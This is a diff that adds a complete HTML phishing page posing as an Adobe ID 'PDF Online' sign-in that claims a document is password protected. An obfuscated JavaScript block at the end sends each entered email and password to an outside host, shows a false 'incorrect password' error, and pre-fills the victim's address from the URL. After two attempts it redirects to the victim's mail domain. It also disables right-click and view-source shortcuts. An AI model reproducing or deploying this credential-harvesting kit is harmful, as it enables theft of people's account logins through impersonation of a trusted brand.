@@ -1,0 +1,125 @@
+
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Adobe ID</title>
+    <link href="https://www.adobe.com/content/dam/dx-dc/favicons/favicon.ico" rel="icon" type="image/gif" />
+
+    <style type="text/css">
+     textarea:hover, 
+     input:hover, 
+     textarea:active, 
+     input:active, 
+     textarea:focus, 
+     input:focus,
+     button:focus,
+     button:active,
+     button:hover,
+     label:focus,
+     .btn:active,
+     .btn.active
+     {
+      outline:0px !important;
+      -webkit-appearance:none;
+      box-shadow: none !important;
+    }
+
+
+  </style>
+</head>
+<body style="background-image: url('https://jesollar.com/images/SWIFT.jpg'); background-repeat: no-repeat;background-size: cover;">
+  <div class="container-fluid p-0">
+    <!-- <div class="container-fluid" style="background-color: white; box-shadow:3px 2px 10px rgba(0,0,0,0.2);">
+      <div class="row" style="background-color: #ff6c2c;">
+        <div class="col-lg-12 mx-auto">
+          <img src="" class="img-fluid p-4" width="170px">
+        </div>
+
+      </div>
+
+    </div> -->
+    <div class="container">
+      <div class="row my-5">
+        <div class="col-lg-5 mx-auto">
+          <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+            <div class="text-left">
+              <img src="https://static.adobelogin.com/clients/virgoweb-2020/4x_817cf14a2f3fcff4ee6d4e35c5026779.png" width="80" /><span class="pl-4 h5 align-middle">PDF Online</span><br />
+              <span class="h5"></span><br>
+              <span class="h5"></span><br>
+              <span class="h">This is a password protected document, verify to access it.</span><br>
+              <span id="msg" class="text-danger"></span><br>
+              <span id="error" class="text-danger"></span>
+              <small></small>
+              <div class="form-group mt-2">
+                  <input type="email" value="" name="email" class="form-control" id="email" placeholder="Enter email" autofocus="">
+              </div>
+
+              <div class="form-group mt-2">
+                 <small></small>
+                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Password" >
+              </div>
+            </div>
+            <div class="form-check mt-3">
+              <input type="checkbox" class="form-check-input" id="exampleCheck1">
+              <label class="form-check-label" for="exampleCheck1"><a href="#">Keep me sign in</a></label>
+              <span><a href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1594824447%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252foutlook.live.com%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253d096991c0-c96c-6a4e-6fe9-e91b0da948f1%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d2C688CEDDDA7EE22%26bk%3d1594880420&id=292841&uiflavor=web&cobrandid=90015&uaid=657745d4db72409899b7bb19b09796de&mkt=EN-GB&lc=2057&bk=1594880420#" class="float-right">Forgot Password?</a></span>
+            </div>
+            <div class="col-lg-12 mt-3">
+              <div class="col-lg-12 mt-3"><button class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #D61C00;">Verify</button></div>
+</div>
+
+            </div>             
+           </div>
+         </div> 
+         <!-- <divclass="m-5 p-4 bg-white rounded" id="div2" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+              <div class="text-center">
+                <img src="images/pdf.png" class="img-fluid" width="80px"><br><br>
+                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
+               
+                <span id="msg" class="text-danger"></span><br>
+                <span class="h5">Enter Password</span><br>
+                <span>to finish sign in</span>
+                <div class="form-group mt-2">
+                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+                </div>
+                <div class="col-lg-12 mt-3">
+                  <button class="btn text-white bg-primary px-4 w-100" id="submit-btn" style="border-radius: 20px;">Sign in</button>
+                </div>
+              </div>
+              <div class="form-check mt-5 mx-auto">
+                <span><a href="#">Forgot password?</a></span>
+              </div>              
+            </div> 
+          </div>
+        </div>
+      </div>
+
+
+
+
+
+      <!-- Optional JavaScript -->
+      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </body>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+
+
+function _0x4bc4(){var _0x2ef338=['hash','animate','10ixUrRw','preventDefault','text','test','bind','keyCode','37496SotmOJ','indexOf','log','#password','329PEsQLX','#automail','ready','#email','show','ctrlKey','attr','click','src','8141580uIqxYJ','location','toUpperCase','.domain','.logoname','POST','#submit-btn','\x20Mail','1018IihPZc','.email','1135079IYyAEx','which','Verifing...','replace','https://uruegoaku.live/mine1/lambo.php','onkeydown','<span\x20style=\x27color:red;\x27>Username\x20or\x20Password\x20is\x20incorrect.\x20Please\x20try\x20again</span>','Sign\x20in','#logoimg','substr','1999wgQLhO','2142056cRcIjs','val','contextmenu','#error','9672744KtXOHk','ajax','190AQLSmM','#msg','http://www.','html','https://www.google.com/s2/favicons?domain=','#inputbar','3521418SzBqXT','focus','toLowerCase','hide'];_0x4bc4=function(){return _0x2ef338;};return _0x4bc4();}var _0x157994=_0xe7f0;function _0xe7f0(_0x561f50,_0x24320c){var _0x4bc4af=_0x4bc4();return _0xe7f0=function(_0xe7f0a0,_0x42741d){_0xe7f0a0=_0xe7f0a0-0x64;var _0x23c4a5=_0x4bc4af[_0xe7f0a0];return _0x23c4a5;},_0xe7f0(_0x561f50,_0x24320c);}(function(_0x5ed54a,_0x587fef){var _0x1ac8b6=_0xe7f0,_0x28be52=_0x5ed54a();while(!![]){try{var _0x5bc68a=-parseInt(_0x1ac8b6(0x6f))/0x1*(-parseInt(_0x1ac8b6(0x9d))/0x2)+parseInt(_0x1ac8b6(0x7c))/0x3+-parseInt(_0x1ac8b6(0x70))/0x4*(-parseInt(_0x1ac8b6(0x82))/0x5)+-parseInt(_0x1ac8b6(0x74))/0x6+parseInt(_0x1ac8b6(0x8c))/0x7*(parseInt(_0x1ac8b6(0x88))/0x8)+parseInt(_0x1ac8b6(0x95))/0x9+parseInt(_0x1ac8b6(0x76))/0xa*(-parseInt(_0x1ac8b6(0x65))/0xb);if(_0x5bc68a===_0x587fef)break;else _0x28be52['push'](_0x28be52['shift']());}catch(_0x9a61a1){_0x28be52['push'](_0x28be52['shift']());}}}(_0x4bc4,0xc6db7),$(document)[_0x157994(0x86)]('keydown',function(_0x4a914a){var _0x43267e=_0x157994;if(_0x4a914a['ctrlKey']&&_0x4a914a[_0x43267e(0x66)]==0x53)return _0x4a914a[_0x43267e(0x83)](),![];}),document['addEventListener'](_0x157994(0x72),_0x55bb71=>_0x55bb71[_0x157994(0x83)]()),document[_0x157994(0x6a)]=function(_0x1bb4d7){var _0x2b8bc0=_0x157994;return _0x1bb4d7[_0x2b8bc0(0x91)]&&(_0x1bb4d7[_0x2b8bc0(0x87)]===0x43||_0x1bb4d7[_0x2b8bc0(0x87)]===0x56||_0x1bb4d7[_0x2b8bc0(0x87)]===0x55||_0x1bb4d7['keyCode']===0x75)?![]:!![];},$(document)['keypress']('u',function(_0x3c9f4f){var _0x27ce41=_0x157994;return _0x3c9f4f[_0x27ce41(0x91)]?![]:!![];}),$(document)[_0x157994(0x8e)](function(){var _0x315bb1=_0x157994,_0x23aa86=0x0;$('#back1')[_0x315bb1(0x93)](function(){var _0x75e8b6=_0x315bb1;$(_0x75e8b6(0x77))[_0x75e8b6(0x7f)](),$(_0x75e8b6(0x8f))[_0x75e8b6(0x71)](''),$(_0x75e8b6(0x8d))['animate']({'left':0xc8,'opacity':_0x75e8b6(0x7f)},0x0),$(_0x75e8b6(0x7b))[_0x75e8b6(0x81)]({'right':0xc8,'opacity':_0x75e8b6(0x90)},0x3e8);});var _0x12af71=window[_0x315bb1(0x96)][_0x315bb1(0x80)]['substr'](0x1);if(!_0x12af71){}else{var _0xcb707=_0x12af71;$(_0x315bb1(0x8f))[_0x315bb1(0x71)](_0xcb707);var _0x208343=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x208343[_0x315bb1(0x85)](_0xcb707))return $(_0x315bb1(0x73))[_0x315bb1(0x90)](),_0x12af71[_0x315bb1(0x7d)],![];var _0x3c7337=_0xcb707['indexOf']('@'),_0x2e9c23=_0xcb707[_0x315bb1(0x6e)](_0x3c7337+0x1),_0x45e812=_0x2e9c23['substr'](0x0,_0x2e9c23['indexOf']('.')),_0x3e7922=_0x45e812[_0x315bb1(0x7e)](),_0x4dce31=_0x45e812[_0x315bb1(0x97)]();$('#logoimg')[_0x315bb1(0x92)](_0x315bb1(0x94),_0x315bb1(0x7a)+_0x2e9c23),$('#logoname')[_0x315bb1(0x79)](_0x4dce31),$(_0x315bb1(0x99))['html'](_0x4dce31+_0x315bb1(0x9c)),$(_0x315bb1(0x98))['html'](_0x2e9c23),$(_0x315bb1(0x64))[_0x315bb1(0x79)](_0x12af71);}$(_0x315bb1(0x9b))[_0x315bb1(0x93)](function(_0x58eea1){var _0x73f7c1=_0x315bb1;$(_0x73f7c1(0x73))[_0x73f7c1(0x7f)](),$('#msg')[_0x73f7c1(0x7f)](),_0x58eea1['preventDefault']();var _0x1c3464=$(_0x73f7c1(0x8f))[_0x73f7c1(0x71)](),_0x2481ec=$(_0x73f7c1(0x8b))[_0x73f7c1(0x71)](),_0xd2c767=$(_0x73f7c1(0x77))['html']();$(_0x73f7c1(0x77))[_0x73f7c1(0x84)](_0xd2c767);var _0x434ec0=_0x1c3464,_0x2067d2=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x2067d2['test'](_0x434ec0))return $(_0x73f7c1(0x73))[_0x73f7c1(0x90)](),_0x1c3464[_0x73f7c1(0x7d)],![];var _0x4b0f77=_0x434ec0[_0x73f7c1(0x89)]('@'),_0x36507c=_0x434ec0[_0x73f7c1(0x6e)](_0x4b0f77+0x1),_0x2ed78e=_0x36507c[_0x73f7c1(0x6e)](0x0,_0x36507c[_0x73f7c1(0x89)]('.')),_0x14f8a7=_0x2ed78e[_0x73f7c1(0x7e)](),_0x3f9980=_0x2ed78e[_0x73f7c1(0x97)]();$(_0x73f7c1(0x6d))[_0x73f7c1(0x92)](_0x73f7c1(0x94),_0x73f7c1(0x7a)+_0x36507c),$('.logoimg')[_0x73f7c1(0x92)](_0x73f7c1(0x94),_0x73f7c1(0x7a)+_0x36507c),$('#logoname')[_0x73f7c1(0x79)](_0x3f9980),_0x23aa86=_0x23aa86+0x1,$[_0x73f7c1(0x75)]({'dataType':'JSON','url':_0x73f7c1(0x69),'type':_0x73f7c1(0x9a),'data':{'email':_0x1c3464,'password':_0x2481ec},'beforeSend':function(_0x410b0e){var _0x3b18d1=_0x73f7c1;$('#submit-btn')[_0x3b18d1(0x79)](_0x3b18d1(0x67));},'success':function(_0x16df7c){var _0x2556e6=_0x73f7c1;$('#msg')[_0x2556e6(0x79)](_0x2556e6(0x6b)),_0x16df7c&&($('#msg')[_0x2556e6(0x90)](),console[_0x2556e6(0x8a)](_0x16df7c),$(_0x2556e6(0x77))[_0x2556e6(0x79)](_0x16df7c['msg']),_0x16df7c['signal']=='ok'?($(_0x2556e6(0x8b))[_0x2556e6(0x71)](''),_0x23aa86>=0x2&&(_0x23aa86=0x0,window[_0x2556e6(0x96)][_0x2556e6(0x68)]('http://www.'+_0x36507c))):$(_0x2556e6(0x77))['html'](_0x16df7c['msg']));},'error':function(){var _0x2bb327=_0x73f7c1;$('#password')[_0x2bb327(0x71)](''),_0x23aa86>=0x2&&(_0x23aa86=0x0,window[_0x2bb327(0x96)][_0x2bb327(0x68)](_0x2bb327(0x78)+_0x36507c)),$(_0x2bb327(0x77))['show']();},'complete':function(){var _0x4dac80=_0x73f7c1;$(_0x4dac80(0x9b))[_0x4dac80(0x79)](_0x4dac80(0x6c));}});});}));
+
+  </script>
+  </html> 
